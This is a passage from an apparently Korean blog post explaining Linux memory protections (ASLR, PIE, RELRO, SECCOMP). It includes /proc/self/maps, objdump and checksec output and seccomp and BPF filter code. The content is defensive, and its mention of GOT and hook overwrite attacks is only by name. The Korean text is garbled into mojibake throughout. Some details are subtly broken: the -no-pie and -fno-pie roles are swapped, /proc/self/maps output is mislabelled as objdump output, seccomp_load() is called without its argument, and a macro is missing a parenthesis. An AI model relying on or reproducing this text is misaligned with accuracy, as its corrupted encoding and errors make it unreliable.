•</li><li>ì˜ˆë¥¼ë“¤ì–´ ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ printfì˜ í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ 0x12345678ì´ë¼ë©´, ë‹¤ìŒë²ˆ ì‹¤í–‰ì‹œì—ë„ ë§ˆì§€ë§‰ 12ë¹„íŠ¸ëŠ” 678ì„ì´ ë³´ì¥ëœë‹¤.</li></ul></li><li>main í•¨ìˆ˜ì˜ ì£¼ì†ŒëŠ” ì—¬ëŸ¬ë²ˆ ì‹¤í–‰í•´ë„ ë³€ê²½ë˜ì§€ ì•ŠëŠ”ë‹¤.</li></ul><h3 id=pie>PIE<a hidden class=anchor aria-hidden=true href=#pie>#</a></h3><ul><li><p>Position Independent Executable ì˜ ì•½ìì´ë‹¤.</p></li><li><p>ASLRì´ ëŸ°íƒ€ì„ì— ìƒì„±ë˜ëŠ” stack, heap, library ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ ëœë¤ ë§¤í•‘í•˜ëŠ” ê¸°ë²•ì´ì—ˆë‹¤ë©´, PIEëŠ” code ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ ëœë¤í•˜ê²Œ ë§¤í•‘í•˜ëŠ” ë³´í˜¸ ê¸°ë²•ì´ë‹¤.</p></li><li><p>ë¦¬ëˆ…ìŠ¤ì˜ ELFëŠ” Executable(ì‹¤í–‰íŒŒì¼) íŒŒì¼ê³¼ Shared Object(ê³µìœ íŒŒì¼) ë¡œ ì–‘ë¶„ë˜ëŠ”ë° Shared Object ëŠ” ë©”ëª¨ë¦¬ ìƒì— ì–´ë””ì— ì˜¬ë ¤ë†“ì•„ë„ ë™ì‘ ê°€ëŠ¥í•˜ë„ë¡ ì„¤ê³„ë˜ì–´ ìˆë‹¤.</p></li><li><p>ë©”ëª¨ë¦¬ ìœ„ì¹˜ì— ì œì•½ì„ ë°›ì§€ ì•ŠëŠ” ì´ëŸ¬í•œ ì„±ì§ˆì„ ê°€ì§„ ì½”ë“œë¥¼ <code>Position-Independent Code</code> ì¤„ì—¬ì„œ <code>PIC</code> ë¼ ë¶€ë¥¸ë‹¤.</p></li><li><p>Shared Object ë“¤ì€ ìµœì´ˆ ì„¤ê³„ ì‹œì— PIC ì†ì„±ì„ ê°–ë„ë¡ ì„¤ê³„ë˜ì—ˆê³ , Executable íŒŒì¼ë“¤ì€ ê·¸ë ‡ì§€ ì•Šì•˜ë‹¤. ì‹¤í–‰ íŒŒì¼ë“¤ë„ PIC ì†ì„±ì„ ê°–ê²Œ í•˜ë ¤ê³  Shared Object í˜•íƒœë¡œ êµ¬ì„±í•˜ì˜€ê³ , ì´ë¥¼ <code>PIE</code>(Position-Independent Executable) ë¼ ëª…ëª…í•˜ì˜€ë‹¤.</p></li><li><p>PIEë¡œ êµ¬ì„±ëœ ì½”ë“œë“¤ì€ ASLR ì´ ì ìš©ë˜ë©´ ë‹¤ë¥¸ Shared Object ì™€ ë§ˆì°¬ê°€ì§€ë¡œ ëœë¤í•œ ì£¼ì†Œì— ë°°ì¹˜ë°›ê²Œ ëœë‹¤.</p></li><li><p>ASLRì— ì˜í•´ PIE ì½”ë“œê°€ ëœë¤í•œ ë©”ëª¨ë¦¬ì— ì ì¬ë˜ë©´ ê·¸ ì‹œì‘ ì£¼ì†Œë¥¼ <code>base code</code>, í˜¹ì€ <code>PIE base</code> ë¼ ì¹­í•œë‹¤.</p></li><li><p><code>PIE</code> ë³´í˜¸ê¸°ë²•ì´ ì ìš©ë˜ë©´ <code>code</code> ì˜ì—­ê³¼ <code>bss</code> ì˜ì—­ì˜ ë©”ëª¨ë¦¬ëŠ” ì‹¤í–‰ì‹œ ë§ˆë‹¤ ëœë¤í•˜ê²Œ ë°°ì •ëœë‹¤.</p></li></ul><h3 id=relro-relocation-read-only>RELRO (RELocation Read-Only)<a hidden class=anchor aria-hidden=true href=#relro-relocation-read-only>#</a></h3><ul><li>ë°ì´í„° ì„¸ê·¸ë¨¼íŠ¸ì—ì„œ ë¶ˆí•„ìš”í•œ ì“°ê¸° ê¶Œí•œì„ ì œê±°í•˜ì—¬ ê³µê²©ì„ ë°©ì§€í•˜ëŠ” ë°©ë²•</li><li>Partial RELRO ì™€ Full RELRO ë‘ ê°€ì§€ ë°©ë²•ì´ ìˆë‹¤.<ul><li>gcc ì»´íŒŒì¼ ì‹œ <code>-no-pie -fno-pie</code> ì˜µì…˜ì„ ë„£ì–´ì„œ pieë¥¼ ì œê±°í•˜ë©´ partial RELRO ë¡œ ë™ì‘í•œë‹¤.</li><li><code>-no-pie</code>ëŠ” ì½”ë“œ ìƒì„± ì˜µì…˜ì´ê³ , <code>-fno-pie</code>ëŠ” ë§í‚¹ ê³¼ì •ì˜ ì˜µì…˜ìœ¼ë¡œ ë‘˜ ë‹¤ ì„¤ì •í•´ì•¼ PIE ì—†ì´ ë°”ì´ë„ˆë¦¬ê°€ ìƒì„±ëœë‹¤.</li><li>ìœ„ ë‘ ì˜µì…˜ ì—†ì´ gcc ì»´íŒŒì¼ì„ ìˆ˜í–‰í•˜ë©´ Full RELROê°€ ì ìš©ëœë‹¤.</li></ul></li><li>Partial RELRO ê°€ ì ìš©ëœ íŒŒì¼ì„ <code>objdump -h</code> ëª…ë ¹ì–´ë¡œ í™•ì¸í•˜ë©´ sectionì— <code>.got</code>ì™€ <code>.got.plt</code> ê°€ í™•ì¸ëœë‹¤.<ul><li><code>.got</code> sectionì—ëŠ” ì‹¤í–‰ë˜ê¸° ì „ì— ë°”ì¸ë”© ë˜ëŠ” ì „ì—­ë³€ìˆ˜ë“¤ì´ ì €ì¥ë˜ë©° ì“°ê¸° ê¶Œí•œì´ ì—†ë‹¤.</li><li><code>.got.plt</code> sectionì—ëŠ” ì‹¤í–‰ë˜ëŠ” ë„ì¤‘ ë°”ì¸ë”© ë˜ëŠ” ì „ì—­ë³€ìˆ˜ë“¤ì´ ì €ì¥ë˜ë©° ì“°ê¸° ê¶Œí•œì´ ë¶€ì—¬ëœë‹¤.</li><li><code>.got.plt</code> ì˜ì—­ì„ ë®ì–´ì“°ëŠ” <code>GOT overwrite</code> ê³µê²©ì— ì·¨ì•½í•˜ë‹¤.</li></ul></li><li>Full RELRO ê°€ ì ìš©ë˜ë©´ í•¨ìˆ˜ë“¤ì˜ ì£¼ì†Œê°€ ë°”ì´ë„ˆë¦¬ ë¡œë”© ì‹œì ì— ëª¨ë‘ ë°”ì¸ë”© ë˜ë¯€ë¡œ .got ì˜ì—­ì—ëŠ” ì“°ê¸° ê¶Œí•œì´ ë¶€ì—¬ë˜ì§€ ì•ŠëŠ”ë‹¤.<ul><li>ë™ì  ë©”ëª¨ë¦¬ í• ë‹¹/í•´ì œì‹œ ë™ì‘í•˜ëŠ” <code>hook</code> ì„ ì´ìš©í•œ ê³µê²©ì¸ <code>Hook Overwrite</code> ì— ì·¨ì•½í•˜ë‹¤.</li></ul></li></ul><h4 id=segment-ê¶Œí•œ-í™•ì¸-ë°©ë²•>segment ê¶Œí•œ í™•ì¸ ë°©ë²•<a hidden class=anchor aria-hidden=true href=#segment-ê¶Œí•œ-í™•ì¸-ë°©ë²•>#</a></h4><ol><li>íŠ¹ì • í”„ë¡œì„¸ìŠ¤ì—ì„œ <code>/proc/self/maps</code> ê²½ë¡œì˜ íŒŒì¼ì„ ì¶œë ¥í•˜ë„ë¡ ì½”ë“œë¥¼ ì‘ì„±í•œë‹¤.</li><li>ì‘ì„±í•œ ì½”ë“œë¥¼ ì»´íŒŒì¼ í•˜ê³ , ì‹¤í–‰ íŒŒì¼ì„ ìƒì„±í•œë‹¤.</li><li>ì‹¤í–‰ íŒŒì¼ì„ ì‹¤í–‰í•˜ì—¬ <code>/proc/self/maps</code> íŒŒì¼ ë‚´ìš©ì„ í™•ì¸í•œë‹¤.</li></ol><ul><li>ë‚´ìš© ì¤‘ <code>íŒŒì¼ëª…</code> ì— í•´ë‹¹í•˜ëŠ” ë¶€ë¶„ì´ ë©”ëª¨ë¦¬ ì‹œì‘ì£¼ì†Œì´ë‹¤.</li><li>ex) <code>objdump -h /usr/bin/cat</code> ê²°ê³¼ì´ë‹¤. <code>/usr/bin/cat</code> ì˜ ë©”ëª¨ë¦¬ ì‹œì‘ì£¼ì†ŒëŠ” 0x561210c55000 ê°€ ëœë‹¤.<pre tabindex=0><code>561210c55000-561210c57000 r--p 00000000 08:20 1773                       /usr/bin/cat
561210c57000-561210c5c000 r-xp 00002000 08:20 1773                       /usr/bin/cat
561210c5c000-561210c5f000 r--p 00007000 08:20 1773                       /usr/bin/cat
561210c5f000-561210c60000 r--p 00009000 08:20 1773                       /usr/bin/cat
561210c60000-561210c61000 rw-p 0000a000 08:20 1773                       /usr/bin/cat
5612123c3000-5612123e4000 rw-p 00000000 00:00 0                          [heap]
7f84ddb0a000-7f84ddb2c000 rw-p 00000000 00:00 0
7f84ddb2c000-7f84ddb5e000 r--p 00000000 08:20 25559                      /usr/lib/locale/C.UTF-8/LC_CTYPE
7f84ddb5e000-7f84ddb5f000 r--p 00000000 08:20 25620                      /usr/lib/locale/C.UTF-8/LC_NUMERIC
7f84ddb5f000-7f84ddb60000 r--p 00000000 08:20 26418                      /usr/lib/locale/C.UTF-8/LC_TIME
7f84ddb60000-7f84ddcd3000 r--p 00000000 08:20 25554                      /usr/lib/locale/C.UTF-8/LC_COLLATE
7f84ddcd3000-7f84ddcd4000 r--p 00000000 08:20 25593                      /usr/lib/locale/C.UTF-8/LC_MONETARY
7f84ddcd4000-7f84ddcd5000 r--p 00000000 08:20 25575                      /usr/lib/locale/C.UTF-8/LC_MESSAGES/SYS_LC_MESSAGES
7f84ddcd5000-7f84ddcd6000 r--p 00000000 08:20 26123                      /usr/lib/locale/C.UTF-8/LC_PAPER
7f84ddcd6000-7f84ddcd7000 r--p 00000000 08:20 25601                      /usr/lib/locale/C.UTF-8/LC_NAME
7f84ddcd7000-7f84ddfbd000 r--p 00000000 08:20 15009                      /usr/lib/locale/locale-archive
7f84ddfbd000-7f84ddfdf000 r--p 00000000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84ddfdf000-7f84de157000 r-xp 00022000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84de157000-7f84de1a5000 r--p 0019a000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84de1a5000-7f84de1a9000 r--p 001e7000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84de1a9000-7f84de1ab000 rw-p 001eb000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84de1ab000-7f84de1b1000 rw-p 00000000 00:00 0
7f84de1b1000-7f84de1b2000 r--p 00000000 08:20 25549                      /usr/lib/locale/C.UTF-8/LC_ADDRESS
7f84de1b2000-7f84de1b3000 r--p 00000000 08:20 26189                      /usr/lib/locale/C.UTF-8/LC_TELEPHONE
7f84de1b3000-7f84de1b4000 r--p 00000000 08:20 25574                      /usr/lib/locale/C.UTF-8/LC_MEASUREMENT
7f84de1b4000-7f84de1bb000 r--s 00000000 08:20 42694                      /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
7f84de1bb000-7f84de1bc000 r--p 00000000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1bc000-7f84de1df000 r-xp 00001000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1df000-7f84de1e7000 r--p 00024000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1e7000-7f84de1e8000 r--p 00000000 08:20 25569                      /usr/lib/locale/C.UTF-8/LC_IDENTIFICATION
7f84de1e8000-7f84de1e9000 r--p 0002c000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1e9000-7f84de1ea000 rw-p 0002d000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1ea000-7f84de1eb000 rw-p 00000000 00:00 0
7ffcf0c34000-7ffcf0c55000 rw-p 00000000 00:00 0                          [stack]
7ffcf0d14000-7ffcf0d18000 r--p 00000000 00:00 0                          [vvar]
7ffcf0d18000-7ffcf0d1a000 r-xp 00000000 00:00 0                          [vdso]
</code></pre></li></ul><ol start=4><li>ìƒì„±í•œ ì‹¤í–‰íŒŒì¼ì„ <code>objdump -h</code> ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•´ section headerë¥¼ í™•ì¸í•œë‹¤.</li></ol><ul><li>section headerì˜ VMAì— í•´ë‹¹í•˜ëŠ” ë¶€ë¶„ì´ ë©”ëª¨ë¦¬ì˜ offsetì´ë‹¤. (3)ì—ì„œ ì°¾ì€ ë©”ëª¨ë¦¬ ì‹œì‘ì£¼ì†Œì— offsetì„ ë”í•˜ë©´ ì‹¤ì œ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li><li>ex) <code>.plt</code> ì˜ ë©”ëª¨ë¦¬ ì£¼ì†ŒëŠ” 0x561210c55000 + 0x0000000000002020 = <code>0x561210C57020</code> ê°€ ëœë‹¤.<pre tabindex=0><code>/usr/bin/cat:     file format elf64-x86-64

Sections:
Idx Name          Size      VMA               LMA               File off  Algn
0 .interp       0000001c  0000000000000318  0000000000000318  00000318  2**0
                CONTENTS, ALLOC, LOAD, READONLY, DATA
1 .note.gnu.property 00000020  0000000000000338  0000000000000338  00000338  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
2 .note.gnu.build-id 00000024  0000000000000358  0000000000000358  00000358  2**2
                CONTENTS, ALLOC, LOAD, READONLY, DATA
3 .note.ABI-tag 00000020  000000000000037c  000000000000037c  0000037c  2**2
                CONTENTS, ALLOC, LOAD, READONLY, DATA
4 .gnu.hash     0000006c  00000000000003a0  00000000000003a0  000003a0  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
5 .dynsym       00000690  0000000000000410  0000000000000410  00000410  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
6 .dynstr       0000033d  0000000000000aa0  0000000000000aa0  00000aa0  2**0
                CONTENTS, ALLOC, LOAD, READONLY, DATA
7 .gnu.version  0000008c  0000000000000dde  0000000000000dde  00000dde  2**1
                CONTENTS, ALLOC, LOAD, READONLY, DATA
8 .gnu.version_r 00000060  0000000000000e70  0000000000000e70  00000e70  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
9 .rela.dyn     00000378  0000000000000ed0  0000000000000ed0  00000ed0  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
10 .rela.plt     00000498  0000000000001248  0000000000001248  00001248  2**3
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
11 .init         0000001b  0000000000002000  0000000000002000  00002000  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
12 .plt          00000320  0000000000002020  0000000000002020  00002020  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
13 .plt.got      00000010  0000000000002340  0000000000002340  00002340  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
14 .plt.sec      00000310  0000000000002350  0000000000002350  00002350  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
15 .text         00003dc2  0000000000002660  0000000000002660  00002660  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
16 .fini         0000000d  0000000000006424  0000000000006424  00006424  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
17 .rodata       0000122c  0000000000007000  0000000000007000  00007000  2**5
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
18 .eh_frame_hdr 000002bc  000000000000822c  000000000000822c  0000822c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
19 .eh_frame     00000ce8  00000000000084e8  00000000000084e8  000084e8  2**3
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
20 .init_array   00000008  000000000000aa90  000000000000aa90  00009a90  2**3
                  CONTENTS, ALLOC, LOAD, DATA
21 .fini_array   00000008  000000000000aa98  000000000000aa98  00009a98  2**3
                  CONTENTS, ALLOC, LOAD, DATA
22 .data.rel.ro  00000198  000000000000aaa0  000000000000aaa0  00009aa0  2**5
                  CONTENTS, ALLOC, LOAD, DATA
23 .dynamic      000001f0  000000000000ac38  000000000000ac38  00009c38  2**3
                  CONTENTS, ALLOC, LOAD, DATA
24 .got          000001c8  000000000000ae28  000000000000ae28  00009e28  2**3
                  CONTENTS, ALLOC, LOAD, DATA
25 .data         000000c0  000000000000b000  000000000000b000  0000a000  2**5
                  CONTENTS, ALLOC, LOAD, DATA
26 .bss          00000198  000000000000b0c0  000000000000b0c0  0000a0c0  2**5
                  ALLOC
27 .gnu_debuglink 00000034  0000000000000000  0000000000000000  0000a0c0  2**2
                  CONTENTS, READONLY
</code></pre></li></ul><ol start=5><li>(4)ì—ì„œ í™•ì¸í•œ ë©”ëª¨ë¦¬ ì£¼ì†Œê°€ (3)ì—ì„œ ì¶œë ¥í•œ ë©”ëª¨ë¦¬ ì£¼ì†Œë³„ ê¶Œí•œì„ ëŒ€ì¡°í•˜ì—¬, í•´ë‹¹ ì˜ì—­ì˜ ê¶Œí•œì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ol><ul><li>.plt ì˜ì—­ì¸ <code>0x561210C57020</code> ëŠ”
<code>561210c57000-561210c5c000 r-xp 00002000 08:20 1773 /usr/bin/cat</code> ë¼ì¸ì— í•´ë‹¹í•˜ë©°, ì½ê¸°/ì‹¤í–‰ ê¶Œí•œì´ ìˆê³ , ì“°ê¸° ê¶Œí•œì€ ë¶€ì—¬ë˜ì§€ ì•Šì€ ê²ƒì´ í™•ì¸ëœë‹¤.</li><li>RELROê°€ ì ìš©ë˜ì–´ <code>.fini_array</code> ì™€ <code>.init_array</code> ì˜ì—­ì€ ì“°ê¸° ê¶Œí•œì´ ì—†ëŠ” ê²ƒì´ í™•ì¸ëœë‹¤.</li><li>checksec ëª…ë ¹ìœ¼ë¡œ í™•ì¸ ê²°ê³¼ Full RELROê°€ ì ìš©ëœ ê²ƒì´ í™•ì¸ëœë‹¤.<pre tabindex=0><code>checksec /usr/bin/cat
[*] &#39;/usr/bin/cat&#39;
  Arch:     amd64-64-little
  RELRO:    Full RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  FORTIFY:  Enabled
</code></pre></li></ul><h3 id=sandbox>Sandbox<a hidden class=anchor aria-hidden=true href=#sandbox>#</a></h3><ul><li>ì™¸ë¶€ì™€ ë‚´ë¶€ì˜ í™˜ê²½ì„ ë¶„ë¦¬í•˜ì—¬ ì™¸ë¶€ë¡œë¶€í„° ì‹œìŠ¤í…œì„ ê²©ë¦¬ ë³´í˜¸í•˜ëŠ” ê¸°ë²•ìœ¼ë¡œ, Allow List / Deny List ë¥¼ í†µí•´ í•„ìš”í•œ ì‹œìŠ¤í…œ ì½œ í˜¹ì€ íŒŒì¼ ì ‘ê·¼ ê¶Œí•œë§Œ í—ˆìš©í•˜ì—¬ ì™¸ë¶€ ê³µê²©ì„ ìµœì†Œí™” í•œë‹¤.</li></ul><h4 id=seccomp>SECCOMP<a hidden class=anchor aria-hidden=true href=#seccomp>#</a></h4><ul><li>ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì—ì„œ ìƒŒë“œë°•ìŠ¤ ë§¤ì»¤ë‹ˆì¦˜ì„ ì œê³µí•˜ëŠ” ë³´ì•ˆ ê¸°ëŠ¥ìœ¼ë¡œ, <code>SECure COMPuting mode</code> ë¥¼ ì¶•ì•½í•œ ë‹¨ì–´ì´ë‹¤.</li><li>í—ˆê°€ë˜ì§€ ì•Šì€ ì‹œìŠ¤í…œ ì½œì„ ì–´í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ í˜¸ì¶œ í•  ê²½ìš°, SECCOMPëŠ” ì¦‰ì‹œ ì–´í”Œë¦¬ì¼€ì´ì…˜ì„ ì¢…ë£Œì‹œí‚¨ë‹¤.</li><li>SECCOMPëŠ” ë‘ ê°€ì§€ ëª¨ë“œë¡œ ë™ì‘ì„ ì„¤ì • í•  ìˆ˜ ìˆë‹¤.</li></ul><ol><li>SECCOMP_MODE_STRICT</li></ol><ul><li>read , write , exit , sigreturn ë§Œ í˜¸ì¶œì´ ê°€ëŠ¥í•œ ëª¨ë“œ</li><li>ì´ì™¸ì˜ ì‹œìŠ¤í…œ ì½œì´ í˜¸ì¶œë˜ë©´ SIGKILL ì‹œê·¸ë„ì„ ë°œìƒì‹œí‚¨ë‹¤.</li></ul><ol start=2><li>SECCOMP_MODE_FILTER</li></ol><ul><li>ì›í•˜ëŠ” ì‹œìŠ¤í…œ ì½œì„ í•„í„°ì— ë„£ê³  ê´€ë¦¬ í•  ìˆ˜ ìˆëŠ” ëª¨ë“œ</li><li><a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>Linux ì‹œìŠ¤í…œì½œ index ì°¸ì¡°</a></li><li>seccomp ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™œìš©í•  ì‹œ, <code>seccomp-tools</code> ë¡œ ê²€ì‚¬í•˜ë©´ ì‹œìŠ¤í…œì½œì˜ ë²ˆí˜¸ê°€ <code>0x40000000</code> ë³´ë‹¤ ì‘ì€ì§€ ê²€ì‚¬í•˜ëŠ” ë¡œì§ì´ ê²€ì¶œëœë‹¤ëŠ” íŠ¹ì§•ì´ ìˆë‹¤.<ul><li>ex) <code>0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005</code></li><li>x86-64 ABI(Application Binary Interface) ëŠ” x32 ABI ë¥¼ í˜¸í™˜í•  ìˆ˜ ìˆì§€ë§Œ, ë‘ ABI ëŠ” ì—„ì—°íˆ ë‹¤ë¥´ê³  x86-64 ABI ì¸ì§€ x32 ABI ì¸ì§€ë¥¼ êµ¬ë¶„ì§“ê¸° ìœ„í•´ 0x40000000 ê³¼ ë¹„êµëŒ€ì†Œë¥¼ ìˆ˜í–‰í•œë‹¤.</li><li>x86-64 ì—ì„œ ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ëŠ” í•¨ìˆ˜ì¸ <code>do_syscall_64</code> ëŠ” x86-64ì˜ ì‹œìŠ¤í…œ ì½œ í˜¸ì¶œì— ì‹¤íŒ¨í•˜ë©´ x32 ì‹œìŠ¤í…œ ì½œ í˜¸ì¶œì„ ì‹œë„í•˜ë„ë¡ ì‘ì„±ë˜ì–´ ìˆë‹¤.</li><li>x32 ì‹œìŠ¤í…œì½œì€ x86-64 ì‹œìŠ¤í…œ ì½œì— <code>__X32_SYSCALL_BIT</code> ë¥¼ ë”í•œ ê°’ìœ¼ë¡œ ì§€ì •ë˜ì–´ ìˆìœ¼ë©°, <code>__X32_SYSCALL_BIT</code> ì˜ ê°’ì´ ë°”ë¡œ <code>0x40000000</code> ì´ë‹¤.</li><li></li></ul></li></ul><h5 id=ì„¤ì¹˜-ë°-ì‚¬ìš©>ì„¤ì¹˜ ë° ì‚¬ìš©<a hidden class=anchor aria-hidden=true href=#ì„¤ì¹˜-ë°-ì‚¬ìš©>#</a></h5><ul><li>aptë¥¼ ì´ìš©í•œ ì„¤ì¹˜ : <code>apt install libseccomp-dev libseccomp2 seccomp</code></li><li>ì‚¬ìš© ë°©ë²•:<pre tabindex=0><code>#include &lt;linux/seccomp.h&gt;
...

prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);  // STRICT ëª¨ë“œë¡œ ë™ì‘
</code></pre><pre tabindex=0><code>#include &lt;linux/seccomp.h&gt;
...
// filter mode ë¡œ ë™ì‘
scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);  // ì‹œìŠ¤í…œ ì½œ í˜¸ì¶œì‹œ ë°œìƒí•  ì´ë²¤íŠ¸ í•¨ìˆ˜ ì„¤ì •. SCMP_ACT_KILL ì€ ë”°ë¡œ ì •ì˜í•˜ì§€ ì•Šì€ ëª¨ë“  ì‹œìŠ¤í…œ ì½œì— ëŒ€í•´ default ë¡œ SIGKILL ë°˜í™˜í•œë‹¤ëŠ” ëœ»
// seccomp_init(SCMP_ACT_ALLOW) ëŠ” ë°˜ëŒ€ë¡œ ë”°ë¡œ ì •ì˜í•˜ì§€ ì•Šì€ ëª¨ë“  ì‹œìŠ¤í…œ ì½œì— ëŒ€í•´ default ë¡œ ì‹¤í–‰ì„ í—ˆê°€í•œë‹¤ëŠ” ëœ»
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);  // ê·œì¹™ ì¶”ê°€. &#39;rt_sigreturn&#39; ì‹œìŠ¤í…œ ì½œ í—ˆìš©
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);  // ê·œì¹™ ì¶”ê°€. &#39;open&#39; ì‹œìŠ¤í…œ ì½œ ê¸ˆì§€
seccomp_load();  // ìœ„ì—ì„œ ë°˜ì˜í•œ ê·œì¹™ë“¤ ì ìš©
</code></pre></li><li>strict mode ì—ì„œëŠ” system call í˜¸ì¶œì‹œ __secure_computing_strict() í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ê³ , __NR_seccomp_read, __NR_seccomp_write, __NR_seccomp_exit, __NR_seccomp_sigreturn ê°€ ì•„ë‹Œ system call ì´ í˜¸ì¶œë˜ì—ˆë‹¤ë©´ SIGKILL ì„ ë°œìƒì‹œí‚¤ê³  SECCOMP_RET_KILL ì„ ë°˜í™˜í•œë‹¤.</li><li>BPF (Berkeley Packet Filter) : ì»¤ë„ì—ì„œ ì§€ì›í•˜ëŠ” VMìœ¼ë¡œ, ë°ì´í„°ë¥¼ ë¹„êµí•˜ê³  ê²°ê³¼ì— ë”°ë¼ íŠ¹ì • êµ¬ë¬¸ìœ¼ë¡œ ë¶„ê¸°í•˜ë„ë¡ ì„¤ì • í•  ìˆ˜ ìˆì–´ ë„¤íŠ¸ì›Œí¬ íŒ¨í‚·ì„ ë¶„ì„í•˜ê³  í•„í„°ë§ í•˜ëŠ” ìš©ë„ë¡œ ì£¼ë¡œ ì‚¬ìš©í•˜ì˜€ìœ¼ë‚˜, íŠ¹ì • ì‹œìŠ¤í…œ ì½œ í˜¸ì¶œ ì‹œ ìˆ˜í–‰ ë  ë™ì‘ì„ ê²°ì •í•˜ëŠ” ìš©ë„ë¡¤ë„ ì‚¬ìš©ì´ ê°€ëŠ¥í•˜ë‹¤.<ul><li>ëª…ë ¹ì–´ ì¡°í•© ë° ë§¤í¬ë¡œë¥¼ ì‚¬ìš©í•˜ì—¬ ë™ì‘ êµ¬ë¬¸ì„ ì‘ì„± í•  ìˆ˜ ìˆë‹¤.<ul><li>ëª…ë ¹ì–´:<ul><li>BPF_LD: ì¸ìë¡œ ì „ë‹¬ëœ ê°’ ë³µì‚¬</li><li>BPF_JMP: ì§€ì •í•œ ë¶„ê¸°ë¡œ ì´ë™</li><li>BPF_JEQ: ë¹„êµ ê°’ì´ ì°¸ì¼ ê²½ìš° ì§€ì •í•œ ìœ„ì¹˜ë¡œ ì´ë™</li><li>BPF_RET: ì¸ìë¡œ ì „ë‹¬ëœ ê°’ ë°˜í™˜</li></ul></li><li>ë§¤í¬ë¡œ:<ul><li>BPF_STMT</li><li>BPF_JUMP</li></ul></li><li>ì‚¬ìš© ì˜ˆì‹œ:<pre tabindex=0><code>BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr)  // ë§¤í¬ë¡œë¥¼ í™œìš©í•´ ì‰½ê²Œ ëª…ë ¹ì–´ ì‹¤í–‰
BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0)  // argv[1], argv[2] ë¹„êµ ê²°ê³¼ì— ë”°ë¼ íŠ¹ì • offset(argv[3] or argv[4]) ë¡œ ë¶„ê¸°
</code></pre><ul><li>ì•„í‚¤í…ì²˜ ê²€ì‚¬:</li></ul><pre tabindex=0><code>// X86_64ë¼ë©´ ë‹¤ìŒ ì½”ë“œë¡œ ë¶„ê¸°í•˜ê³ , ë‹¤ë¥¸ ì•„í‚¤í…ì²˜ë¼ë©´ SECCOMP_RET_KILLì„ ë°˜í™˜
#define arch_nr (offsetof(struct seccomp_data, arch))
#define ARCH_NR AUDIT_ARCH_X86_64
BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
</code></pre><ul><li>ì‹œìŠ¤í…œì½œ ê²€ì‚¬:</li></ul><pre tabindex=0><code>// ALLOW_SYSCALL ë¡œ í—ˆê°€ëœ SYSTEM CALLL ì™¸ì—ëŠ” SIGKILL ë°˜í™˜í•˜ë©° ì‹œìŠ¤í…œ ì¢…ë£Œ
#define ALLOW_SYSCALL(name) \
  BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_##name, 0, 1), \
  BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW

#define KILL_PROCESS \
  BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL)

BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
ALLOW_SYSCALL(rt_sigreturn),
ALLOW_SYSCALL(open),
ALLOW_SYSCALL(openat),
ALLOW_SYSCALL(read),
ALLOW_SYSCALL(write),
ALLOW_SYSCALL(exit_group),
KILL_PROCESS,
</code></pre><ul><li>pctrl ì„¤ì • í›„ BPFë¡œ ì‹œìŠ¤í…œ ì½œ í•„í„°ë§</li></ul><pre tabindex=0><code>#include &lt;fcntl.h&gt;
#include &lt;linux/audit.h&gt;
#include &lt;linux/filter.h&gt;
#include &lt;linux/seccomp.h&gt;
